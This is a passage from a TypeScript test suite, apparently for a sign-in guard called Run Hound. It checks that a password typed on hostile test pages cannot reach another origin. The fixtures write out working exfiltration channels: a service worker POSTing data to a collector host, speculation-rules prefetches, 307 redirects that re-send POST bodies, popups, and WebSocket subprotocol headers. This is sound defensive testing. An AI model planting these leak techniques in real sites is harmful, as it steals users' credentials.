          `self.addEventListener("install", () => self.skipWaiting()); self.addEventListener("activate", (e) => e.waitUntil(self.clients.claim()));
self.addEventListener("message", (e) => { fetch(${JSON.stringify(collector.url)} + "/from-service-worker", { method: "POST", mode: "no-cors", body: e.data }); });`,
        );
      },
      // A sign-in page served with a Speculation-Rules header (document rules: prefetch any link to the collector now).
      "GET /channel/prefetch-header": (_req, res) => {
        res.writeHead(200, { "content-type": "text/html; charset=utf-8", "speculation-rules": '"/rules.json"' });
        res.end(exfilPage(CHANNELS["prefetch-header"]));
      },
      "GET /rules.json": (_req, res) => {
        res.writeHead(200, { "content-type": "application/speculationrules+json" });
        res.end(JSON.stringify({ prefetch: [{ where: { href_matches: `${collector.url}/*` }, eagerness: "immediate" }] }));
      },
      // The probe-race tab: a page on the sign-in origin the app's server builds with the password, posted to /bounce.
      "GET /probe-race/bounce-auto": (_req, res) => {
        res.writeHead(200, { "content-type": "text/html; charset=utf-8" });
        res.end(
          shell("Bounce", `<form id="bf" method="post" action="/bounce"><input name="password" value="${escapeHtml(lastPassword)}"></form><script>document.getElementById("bf").submit();</script>`),
        );
      },
      // A same-origin endpoint whose query a weak-password page requests (?user=demo): it must not be taken for a leak.
      "GET /api/state": (_req, res) => {
        res.writeHead(204);
        res.end();
      },
      // A classic form POST answered with a 307: the browser sends the same POST, body and all, to the collector.
      "POST /bounce": (_req, res) => {
        res.writeHead(307, { location: `${collector.url}/landing` });
        res.end();
      },
      // The password step's POST, answered with a redirect to the refused host: a 307 keeps the method and the body (the
      // password with it), a 302 turns it into a GET without them.
      "POST /two/password-307": (_req, res) => {
        res.writeHead(307, { location: `http://${SSO_HOST}:${new URL(collector.url).port}/landing` });
        res.end();
      },
      "POST /two/password-302": (_req, res) => {
        res.writeHead(302, { location: `http://${SSO_HOST}:${new URL(collector.url).port}/landing` });
        res.end();
      },
      "POST /api/attempted": (_req, res) => {
        res.writeHead(204);
        res.end();
        const reported = attempts();
        for (const waiter of attemptWaiters) {
          if (!reported.includes(waiter.what)) continue;
          attemptWaiters.delete(waiter);
          waiter.resolve();
        }
      },
      // Answered at once, then this process is held for STALL_MS (STALLED_POPUPS): nothing here runs meanwhile.
      "GET /stall": (_req, res) => {
        res.writeHead(204);
        res.end();
        const until = Date.now() + STALL_MS;
        while (Date.now() < until) {
          // Held on purpose: the browser goes on alone.
        }
      },
      "GET /favicon.ico": (_req, res) => {
        res.writeHead(204);
        res.end();
      },
    },
  });
});

afterAll(async () => {
  await closeBrowser();
  await plain?.close();
  await site?.close();
  await collector?.close();
});

function account(path: string, extra: Partial<TestAccount> = {}): TestAccount {
  return { id: "a", label: "Account A", loginUrl: `${site.url}${path}`, username: EMAIL, password: PASSWORD, ...extra };
}

function reset(): void {
  site.requests.length = 0;
  collector.seen.length = 0;
}

/**
 * Signs in by hand in a plain browser (no Run Hound): what a person's browser would do on `path`. A page that `stays`
 * (its leak goes out from another tab) is waited on until the collector receives something carrying the password.
 */
async function signInByHand(path: string, stays = false, password = PASSWORD): Promise<void> {
  const context = await plain.newContext();
  try {
    const page = await context.newPage();
    await page.goto(`${site.url}${path}`, { waitUntil: "networkidle" });
    await page.locator("#e").fill(EMAIL);
    await page.locator("#pw").fill(password);
    await page.locator("button[type=submit]").click();
    if (stays) await soon(collector.received(carrying(password)), `nothing carrying the password reached the collector from ${path}`);
    else await page.waitForURL((url) => url.pathname !== path);
    await page.waitForLoadState("load").catch(() => undefined);
  } finally {
    await context.close();
  }
}

/** Resolves once the collector has received something carrying `secret` (a control's leak), else says where from. */
const leaked = (from: string, secret = PASSWORD) => soon(collector.received(carrying(secret)), `nothing carrying the password reached the collector from ${from}`);

/** Resolves once the page has reported that it tried `what` (attempted), else says it never did. */
const reported = (what: string) => soon(attempted(what), `the page never reported that it tried "${what}"`);

/** signIn's outcome: what it resolved with, or the SignInError it threw (anything else fails the test). */
async function outcomeOf(promise: Promise<SignedIn>): Promise<SignedIn | SignInError> {
  const outcome = await promise.then(
    (signedIn) => signedIn,
    (err: unknown) => err,
  );
  if (!(outcome instanceof SignInError)) expect(outcome, "signIn should resolve or reject with a SignInError").toHaveProperty("state");
  return outcome as SignedIn | SignInError;
}

/** The collector gets a moment for anything that is still on its way (a beacon queued by a page being left). */
const settle = () => new Promise((resolve) => setTimeout(resolve, 750));

describe("the leaking pages, by hand (so the signIn tests below fail only for signIn's reasons)", () => {
  for (const leak of LEAKS) {
    it(`${leak.name}: ${leak.does} reaches the other origin`, async () => {
      reset();
      await signInByHand(`/leak/${leak.name}`, leak.stays);
      await leaked(`/leak/${leak.name}`);
      await reported(leak.name);
    });
  }
});

describe("signIn stops the password on its way to another origin", () => {
  for (const leak of LEAKS) {
    it(`${leak.name}: ${leak.does}`, async () => {
      reset();
      const outcome = await outcomeOf(signIn(browser, account(`/leak/${leak.name}`)));
      // The page did try.
      await reported(leak.name);
      await settle();
      // Nothing carrying the password reached the other origin, in any form.
      expect(leaks()).toEqual([]);
      if (outcome instanceof SignInError) {
        expect(outcome.message).not.toContain(PASSWORD);
        if (leak.says) expect(outcome.message).toMatch(leak.says);
        else expect(outcome.message).toContain(`sends the password to ${collector.url}`);
      } else {
        // A page that can only leak by moving on or opening a tab can't have signed in.
        expect(leak.stays, "signIn should have failed").toBeUndefined();
      }
    });
  }
});

describe("signIn with a common password", () => {
  it(`"${COMMON}", in the sign-in page's address and in what it loads before it is typed, and inside a path segment after: signs in`, async () => {
    reset();
    const result = await signIn(browser, account("/demo/sign-in?mode=demo", { password: COMMON }));
    expect(new URL(result.landedOn).pathname).toBe("/signed-in");
    // The page loaded what it loads: nothing was stopped for the password's sake.
    expect(collector.seen.map((s) => new URL(s.url, "http://x").pathname)).toEqual(expect.arrayContaining(["/demo.gif", "/assets/demo-theme.css"]));
    // The password went once, to the sign-in request.
    expect(site.requests.filter((r) => r.body.includes(`"password":"${COMMON}"`)).map((r) => `${r.method} ${r.url}`)).toEqual(["POST /api/login"]);
  });
});

describe("signIn: a two-step password step redirected to a host the safety gate refuses", () => {
  /** A browser that sends SSO_HOST to 127.0.0.1, so whatever reached it is recorded by the collector. */
  let ssoBrowser: Browser;

  beforeAll(async () => {
    ssoBrowser = await chromium.launch({ args: [`--host-resolver-rules=MAP ${SSO_HOST} 127.0.0.1`] });
  });

  afterAll(async () => {
    await ssoBrowser?.close();
  });

  it("by hand: the 307 re-sends the password to the refused host", async () => {
    reset();
    const page = await ssoBrowser.newPage();
    try {
      await page.goto(`${site.url}/two/sign-in-307`);
      await page.locator("#li-email").fill(EMAIL);
      await page.getByRole("button", { name: "Continue" }).click();
      await page.locator("#li-pass:visible").fill(PASSWORD);
      await page.getByRole("button", { name: "Continue" }).click();
      await page.waitForURL((url) => url.hostname === SSO_HOST);
    } finally {
      await page.close();
    }
    expect(leaks()).toEqual(["http POST /landing"]);
    expect(collector.seen[0]?.headers.host).toBe(`${SSO_HOST}:${new URL(collector.url).port}`);
  });

  for (const status of ["307", "302"] as const) {
    it(`answered with a ${status}: fails, and nothing carrying the password reaches the refused host`, async () => {
      reset();
      const outcome = await outcomeOf(signIn(ssoBrowser, account(`/two/sign-in-${status}`), REFUSED_SSO));
      await settle();
      expect(outcome, "signIn should have failed").toBeInstanceOf(SignInError);
      expect((outcome as SignInError).message).not.toContain(PASSWORD);
      // Both steps ran on the sign-in origin: the password step's POST was sent there.
      await reported("password-step");
      expect(site.requests.filter((r) => r.method === "POST" && r.url.startsWith("/two/")).map((r) => r.url)).toEqual([`/two/password-${status}`]);
      expect(leaks()).toEqual([]);
      expect(collector.seen.filter((s) => s.method !== "GET").map((s) => `${s.method} ${s.url}`)).toEqual([]);
    });
  }
});

/** Signs in by hand on a channel page in a plain browser (no Run Hound) and waits for the collector to receive the password. */
async function channelReachesByHand(path: string): Promise<void> {
  const context = await plain.newContext();
  try {
    const page = await context.newPage();
    await page.goto(`${site.url}${path}`, { waitUntil: "networkidle" });
    await page.locator("#e").fill(EMAIL);
    await page.locator("#pw").fill(PASSWORD);
    await page.locator("button[type=submit]").click();
    await page.locator("#ok").waitFor();
    await leaked(path);
  } finally {
    await context.close();
  }
}

describe("signIn closes the channels the context routes never see (0.6.0 review)", () => {
  const channels: { name: keyof typeof CHANNELS; does: string }[] = [
    { name: "worker-shared", does: "a shared worker's fetch to another origin" },
    { name: "worker-ws", does: "a WebSocket opened inside a dedicated worker" },
    { name: "popup", does: "a popup that POSTs the password to a 307 that redirects to another origin" },
    { name: "prefetch", does: "a speculation-rules prefetch with the password in its URL" },
    { name: "prefetch-nested", does: "a speculation-rules prefetch from a rules script nested below <body>" },
    { name: "prefetch-retype", does: "a speculation-rules prefetch from a script made a rules script after it was inserted" },
    { name: "prefetch-header", does: "a prefetch of a link with the password, by the document rules of a Speculation-Rules header" },
    { name: "service-worker", does: "a service worker registered from the sign-in origin, handed the password" },
  ];

  // Each channel reaches the collector by hand (no Run Hound), so the signIn test below fails only for signIn's reasons.
  for (const { name, does } of channels) {
    it(`by hand: ${does} reaches the other origin`, async () => {
      reset();
      await channelReachesByHand(`/channel/${name}`);
      await reported(name);
    });
  }

  // With the guarded sign-in context the channel is closed: the page tries, nothing carrying the password gets out, and
  // sign-in still succeeds (the password reached only the sign-in request on the sign-in origin).
  for (const { name, does } of channels) {
    it(`${name}: ${does} is stopped, and the password never reaches the other origin`, async () => {
      reset();
      const result = await signIn(browser, account(`/channel/${name}`));
      expect(result).toHaveProperty("state");
      await reported(name);
      await settle();
      expect(leaks()).toEqual([]);
      // The password (JSON-escaped in the body) went once, to the sign-in request on the sign-in origin.
      const escaped = JSON.stringify(PASSWORD).slice(1, -1);
      expect(site.requests.filter((r) => r.body.includes(PASSWORD) || r.body.includes(escaped)).map((r) => `${r.method} ${r.url}`)).toEqual(["POST /api/login"]);
    });
  }
});

describe("signIn: tabs opened while this process is held, so the browser shows each before anyone here hears of it", () => {
  it("by hand: each tab carries the password to the other origin", async () => {
    reset();
    await channelReachesByHand("/channel/popup-stalled");
    await reported("popup-stalled");
    expect(site.requests.filter((r) => r.url === "/stall")).toHaveLength(STALLED_ROUNDS);
  });

  // 0.6.0, the whole suite: Run Hound closed such a tab before Playwright had let it go (runIfWaitingForDebugger), the
  // renderer it shares with the sign-in page stayed paused, and signIn never returned. Its own browser: a signIn that
  // never returns leaves its guard on the browser it was given.
  it("with signIn: each tab is closed without freezing the sign-in page, nothing gets out, and signing in succeeds", async () => {
    reset();
    const own = await chromium.launch();
    try {
      const result = await soon(signIn(own, account("/channel/popup-stalled")), "signIn never returned: the sign-in page stopped answering once a tab it opened was closed");
      expect(result).toHaveProperty("state");
      await reported("popup-stalled");
      expect(site.requests.filter((r) => r.url === "/stall")).toHaveLength(STALLED_ROUNDS);
      await settle();
      expect(leaks()).toEqual([]);
      // No tab got as far as its own page: each was closed, and every request it made was stopped.
      expect(site.requests.filter((r) => r.url === "/bounce-tab" || r.url === "/bounce").map((r) => r.url)).toEqual([]);
      const escaped = JSON.stringify(PASSWORD).slice(1, -1);
      expect(site.requests.filter((r) => r.body.includes(PASSWORD) || r.body.includes(escaped)).map((r) => `${r.method} ${r.url}`)).toEqual(["POST /api/login"]);
    } finally {
      await own.close();
    }
  });
});

describe("signIn does not fail a legitimate sign-in on a weak-password false positive (0.6.0 review)", () => {
  it(`"${WEAK_SUBSTRING}" as a substring of a token on another origin ("latest"): signs in`, async () => {
    reset();
    const result = await signIn(browser, account("/weak/substring", { password: WEAK_SUBSTRING }));
    expect(result).toHaveProperty("state");
    // The cross-origin request that merely contains the password as a substring was not stopped: it reached the collector.
    await soon(collector.received((s) => s.url.includes("ref=latest")), "the request with ?ref=latest never reached the collector");
    // The password itself only ever went to the sign-in request.
    expect(site.requests.filter((r) => r.body.includes(`"password":"${WEAK_SUBSTRING}"`)).map((r) => `${r.method} ${r.url}`)).toEqual(["POST /api/login"]);
  });

  it(`"${COMMON}" as a same-origin query value ("?user=demo") requested after the password is typed: signs in`, async () => {
    reset();
    const result = await signIn(browser, account("/weak/same-origin-query", { password: COMMON }));
    expect(result).toHaveProperty("state");
    // The same-origin request whose query value equals the weak password was not taken for a GET-form leak.
    await expect.poll(() => site.requests.some((r) => r.url === "/api/state?user=demo")).toBe(true);
  });

  it(`"${WEAK_SUBSTRING}" inside a longer string of a JSON body sent to another origin ({"v":"latest"}): signs in`, async () => {
    reset();
    const result = await signIn(browser, account("/weak/json-substring", { password: WEAK_SUBSTRING }));
    expect(result).toHaveProperty("state");
    await soon(collector.received((s) => s.url === "/collect" && s.body === JSON.stringify({ v: "latest" })), "the JSON body never reached the collector");
  });

  it(`"${WEAK_SUBSTRING}" inside a Basic header's value sent to another origin (user:latest): signs in`, async () => {
    reset();
    const result = await signIn(browser, account("/weak/basic-substring", { password: WEAK_SUBSTRING }));
    expect(result).toHaveProperty("state");
    const basic = `Basic ${Buffer.from("user:latest").toString("base64")}`;
    await soon(collector.received((s) => s.url === "/basic" && s.headers.authorization === basic), "the Basic header never reached the collector");
  });
});

describe("signIn stops a strong password in a same-origin request's address (0.6.0 review, round 2)", () => {
  for (const [path, does] of [
    ["/strong/same-origin-query", "as a query value"],
    ["/strong/same-origin-json-query", "JSON-escaped and percent-encoded in a query value"],
  ] as const) {
    it(`a fetch to the sign-in origin with the password ${does}: fails, and the request never reaches the app`, async () => {
      reset();
      const outcome = await outcomeOf(signIn(browser, account(path)));
      expect(outcome, "signIn should have failed").toBeInstanceOf(SignInError);
      expect((outcome as SignInError).message).toMatch(/sends the password in the page address/);
      expect((outcome as SignInError).message).not.toContain(PASSWORD);
      // The page did try, and the request was stopped before it reached the app's server (and its access log).
      await reported(path.slice("/strong/".length));
      expect(site.requests.filter((r) => r.url.startsWith("/api/state")).map((r) => r.url)).toEqual([]);
    });
  }
});

describe("signIn stops a weak password under a password key in a same-origin request's address (0.6.0 final review)", () => {
  for (const [path, what, does] of [
    ["/weak/same-origin-password-query", "weak-password-query", "a fetch with ?password="],
    ["/weak/same-origin-pwd-image", "weak-pwd-image", "an image with &pwd="],
  ] as const) {
    it(`"${COMMON}" in ${does}<password> to the sign-in origin: fails, and the request never reaches the app`, async () => {
      reset();
      const outcome = await outcomeOf(signIn(browser, account(path, { password: COMMON })));
      expect(outcome, "signIn should have failed").toBeInstanceOf(SignInError);
      expect((outcome as SignInError).message).toMatch(/sends the password in the page address/);
      await reported(what);
      expect(site.requests.filter((r) => r.url.startsWith("/api/state")).map((r) => r.url)).toEqual([]);
    });
  }
});

describe("signIn: a page that closes its own tab after signing in, with a pagehide send (0.6.0 review, round 2)", () => {
  it("by hand: Chromium ignores window.close() in a tab opened like Run Hound opens it (two history entries), so nothing is sent", async () => {
    reset();
    const context = await plain.newContext();
    try {
      const page = await context.newPage();
      await page.goto(`${site.url}/channel/self-close`, { waitUntil: "networkidle" });
      expect(await page.evaluate(() => history.length)).toBe(2);
      await page.locator("#e").fill(EMAIL);
      await page.locator("#pw").fill(PASSWORD);
      await page.locator("button[type=submit]").click();
      await page.locator("#ok").waitFor();
      await reported("self-close");
      await settle();
      expect(page.isClosed()).toBe(false);
      expect(leaks()).toEqual([]);
    } finally {
      await context.close();
    }
  });

  it("with signIn, window.close() does nothing either: signs in, and the pagehide send never goes", async () => {
    reset();
    const result = await signIn(browser, account("/channel/self-close"));
    expect(result).toHaveProperty("state");
    await reported("self-close");
    await settle();
    expect(leaks()).toEqual([]);
  });
});

describe("signIn: a popup the landing page opens while the sessionStorage probe is opened (0.6.0 review, round 2)", () => {
  it("by hand: when the landing page's window.open is used, its own tab carries the password to the other origin", async () => {
    reset();
    // Signing in by hand has the app's server put this password in the page of the landing page's own tab (lastPassword).
    await signInByHand("/probe-race/sign-in");
    const context = await plain.newContext();
    try {
      const page = await context.newPage();
      await page.goto(`${site.url.replace("//127.0.0.1:", "//localhost:")}/probe-race/landing`);
      // The tab the replaced window.open opens first POSTs the password to /bounce on the sign-in origin.
      const posted = context.waitForEvent("request", { predicate: (r) => r.method() === "POST" && new URL(r.url()).pathname === "/bounce", timeout: 0 });
      await page.evaluate(() => void window.open("/anything"));
      const bounce = await soon(posted, "the landing page's own tab never posted to /bounce");
      expect(holds(bounce.postData() ?? "", PASSWORD)).toBe(true);
      // /bounce is a 307: the browser sends the same POST, password and all, to the collector.
      await leaked("the landing page's own tab");
      expect(leaks()).toEqual(["http POST /landing"]);
    } finally {
      await context.close();
    }
  });

  it("with signIn: the landing page's tab carries nothing out, and signing in fails with the reason", async () => {
    reset();
    const outcome = await outcomeOf(signIn(browser, account("/probe-race/sign-in")));
    await settle();
    // Run Hound did open its probe from the landing page (the page's window.open ran).
    expect(site.requests.map((r) => r.url)).toContain("/probe-race/landing");
    expect(leaks()).toEqual([]);
    expect(collector.seen.filter((s) => s.method === "POST").map((s) => s.url)).toEqual([]);
    if (outcome instanceof SignInError) {
      expect(outcome.message).not.toContain(PASSWORD);
      expect(outcome.message).toContain(`sends the password to ${collector.url}`);
    }
  });
});

describe("signIn: the password requested as a WebSocket subprotocol (0.6.0 review, round 3)", () => {
  it("by hand: the handshake's Sec-WebSocket-Protocol header carries the password to the other origin", async () => {
    reset();
    await signInByHand("/leak-token/ws-protocol", false, TOKEN_SAFE);
    await leaked("/leak-token/ws-protocol", TOKEN_SAFE);
    expect(leaks(TOKEN_SAFE)).toEqual(["ws GET /ws"]);
    expect(collector.seen.find((s) => s.kind === "ws")?.headers["sec-websocket-protocol"]).toBe(TOKEN_SAFE);
    await reported("ws-protocol");
  });

  it("with signIn: the handshake is stopped before it is sent, and signing in fails with the reason", async () => {
    reset();
    const outcome = await outcomeOf(signIn(browser, account("/leak-token/ws-protocol", { password: TOKEN_SAFE })));
    await reported("ws-protocol");
    await settle();
    expect(leaks(TOKEN_SAFE)).toEqual([]);
    expect(collector.seen.filter((s) => s.kind !== "http").map((s) => `${s.kind} ${s.url}`)).toEqual([]);
    expect(outcome, "signIn should have failed").toBeInstanceOf(SignInError);
    expect((outcome as SignInError).message).toContain(`sends the password to ${collector.url}`);
    expect((outcome as SignInError).message).not.toContain(TOKEN_SAFE);
  });

  it(`a subprotocol that isn't the password (graphql-ws), with the common password "${COMMON}": connects, and signs in`, async () => {
    reset();
    const result = await signIn(browser, account("/weak/ws-protocol", { password: COMMON }));
    expect(result).toHaveProperty("state");
    await reported("ws-graphql");
    const handshake = await soon(collector.received((s) => s.kind === "ws" && s.url === "/ws-graphql"), "the graphql-ws handshake never reached the collector");
    expect(handshake.headers["sec-websocket-protocol"]).toBe("graphql-ws");
  });
});

describe("the protocol-level worker layer, without the page's constructor override (0.6.0 review, round 2)", () => {
  /** A plain context (no SIGN_IN_HARDENING init script): the page's Worker and SharedWorker are the browser's own. */
  it("stopUnrouted: a dedicated worker the page starts never runs, and is reported", async () => {
    reset();
    const context = await browser.newContext();
    try {
      const page = await context.newPage();
      const refused: string[] = [];
      await stopUnrouted(page, () => false, (what) => refused.push(what));
      await page.goto(`${site.url}/home`);
      await page.evaluate((pw) => {
        const worker = new Worker("/exfil-dedicated-worker.js");
        worker.postMessage(pw);
      }, PASSWORD);
      await new Promise((resolve) => setTimeout(resolve, 1_500));
      expect(refused).toEqual(["a worker"]);
      expect(collector.seen.map((s) => `${s.kind} ${s.url}`)).toEqual([]);
    } finally {
      await context.close();
    }
  });

  it("guardSignInBrowser: a shared worker the page starts is closed before it runs, and is reported", async () => {
    reset();
    const context = await browser.newContext();
    const page = await context.newPage();
    const refused: string[] = [];
    const release = await guardSignInBrowser(browser, page, { stops: () => false, refuse: (what) => refused.push(what) });
    try {
      await page.goto(`${site.url}/home`);
      await page.evaluate((pw) => {
        const shared = new SharedWorker("/exfil-shared-worker.js");
        shared.port.start();
        shared.port.postMessage(pw);
      }, PASSWORD);
      await new Promise((resolve) => setTimeout(resolve, 1_500));
      expect(refused).toEqual(["a shared worker"]);
      expect(collector.seen.map((s) => `${s.kind} ${s.url}`)).toEqual([]);
    } finally {
      await release();
      await context.close();
    }
  });

  it("guardSignInBrowser: a tab the page opens is closed before it sends anything; another context's tab is left alone", async () => {
    reset();
    const context = await browser.newContext();
    const page = await context.newPage();
    const release = await guardSignInBrowser(browser, page, { stops: () => false, refuse: () => undefined });
    const other = await browser.newContext();
    try {
      await page.goto(`${site.url}/home`);
      // A classic form POST into a new tab, answered with a 307 to the collector.
      await page.evaluate((pw) => {
        const form = document.createElement("form");
        form.method = "post";
        form.action = "/bounce";
        form.target = "_blank";
        const field = document.createElement("input");
        field.name = "password";
        field.value = pw;
        form.append(field);
        document.body.append(form);
        form.submit();
      }, PASSWORD);
      // Another context's tabs still open and load.
      const elsewhere = await other.newPage();
      await elsewhere.goto(`${site.url}/home`);
      const popup = await elsewhere.evaluate(() => new Promise<string>((resolve) => {
        const opened = window.open("/home");
        const wait = () => (opened && opened.document.readyState === "complete" && opened.location.pathname === "/home" ? resolve(opened.document.title) : setTimeout(wait, 50));
        wait();
      }));
      expect(popup).toBe("Home");
      await settle();
      expect(leaks()).toEqual([]);
      expect(site.requests.filter((r) => r.url === "/bounce").map((r) => r.method)).toEqual([]);
    } finally {
      await release();
      await other.close();
      await context.close();
    }
  });
});
